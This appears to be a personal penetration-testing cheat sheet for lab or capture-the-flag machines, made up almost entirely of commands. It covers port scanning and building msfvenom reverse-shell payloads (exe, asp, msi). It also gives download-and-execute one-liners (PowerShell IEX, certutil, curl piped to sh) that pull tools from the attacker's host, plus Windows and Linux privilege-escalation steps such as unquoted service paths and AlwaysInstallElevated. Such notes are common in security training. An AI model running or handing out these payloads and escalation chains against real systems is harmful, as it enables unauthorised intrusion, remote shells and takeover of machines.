## Setting
1.export ip=10.10.10.10\
1.5 make directory for nmap result: mkdir nmap && cd nmap
## Ennumeration
2. `nmap -sC -sV -p- -Pn $ip --open -oN result`   AND  `rustscan -a $IP and rustscan -a $IP`. 
3. Check which ports are open. Take note of service running and versions(for searchsploit)\
4. Manual ennumeration. Visit the open ports to see if we can get initial foothold information. e.g anoymous login, default login,etc\
5. Check for vulnerabiltieis on specific ports using nmap script `nmap -p 80,445,139 --script=*vuln* $IP`
## Check vulnerabilities and enumerate for each port
0. Go to the differnet MD files in the repo.

## Creating a reverseshell, uploading a revershell  / creating a stageless payload
0. `msfvenom -p windows/shell_reverse_tcp LHOST=myIP LPORT=1237 -f exe  -o reverse.exe` 
1. `msfvenom -p windows/shell_reverse_tcp LHOST=myIP LPORT=1234 -f asp -o reverse.asp` 

## File Transfer to Window victim
### File transfer via own web server
0. `python3 -m http.server 8080` from linux
1. `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://myIP:80/winpeas.exe', 'winpeas.exe') -exec bypass` from window
2. `certutil.exe -urlcache -f  http://myIp:80/winpeas.exe` from window
### File Transfer via SMB
0. `mkdir share` and move files to transfer
1. `impacket-smbserver smb share/ ` from linux
2. `net use \\myIP\smb` from window
3. `copy \\myIP\smb\winpeas.exe   \windows\temp\winpeas.exe` 

 ## Privilege Escalation for Window
 0. Use PowerUp
 1. `Import-Module .\PowerUp.ps1` or `. .\PowerUp.ps1`
 2. `Invoke-AllChecks`
 3. or `powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://myIP:80/PowerUp.ps1');Invoke-AllChecks"`
 4. Use WinPeas
 5. `winpeas.exe`
 6. Use SharUp if you cant run winpeas or powerup 
 7. `.\SharpUp.exe`
 ### Unquoted Service Path
 0. `Get-UnquotedService` or `wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`
 1. or `sc qc unquotedsvc`
 2.`msfvenom -p windows/shell_reverse_tcp LHOST=myIP LPORT=LISTENINGPORT -f exe  -o Program.exe` (create a payload)
 3.`sc start unquotedsvc` or restart box.
 

 ### Writable Service Executable
  0.`Invoke-AllChecks`\
  1. `msfvenom -p window/shell_reverse_tcp LHOST=MyIP LPORT=LISTENINGPORT -f exe >service.exe`  (payload name has to be same as writable service) 

 ### AlwaysInstallElevate
 check if both values are 1.\
 0.`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`\
 1.`reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`\
 2. `msfvenom -p window/shell_reverse_tcp LHOST=MyIP LPORT=LISTENINGPORT -f msi >payload.msi`  (create a payload) 
 3. Transfer payload to Temp and execute
 4. `msiexec /i "C:\Windows\Temp\payload.msi"`


 ### SeImpersonatePrivilege 

## File Transfer to Linux victim
0.`python3 -c 'import pty; pty.spawn("/bin/bash")'` `export TERM=xterm-256color` Stabalize shell \
1.`python3 -m http.server 8080` `or( 80)`
2.`cd /tmp` move directory where we have write access.
4.`wget http://$myIP:8080/linEum.sh .` \
7.Or manually download the latest linpeas https://github.com/carlospolop/PEASS-ng/releases/tag/20221225

## Privilege Escalation for Linux
0. `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh` which would execute script (run from cd /tmp)
1. `chmod +x linpeas.sh` and `./linpeas.sh`


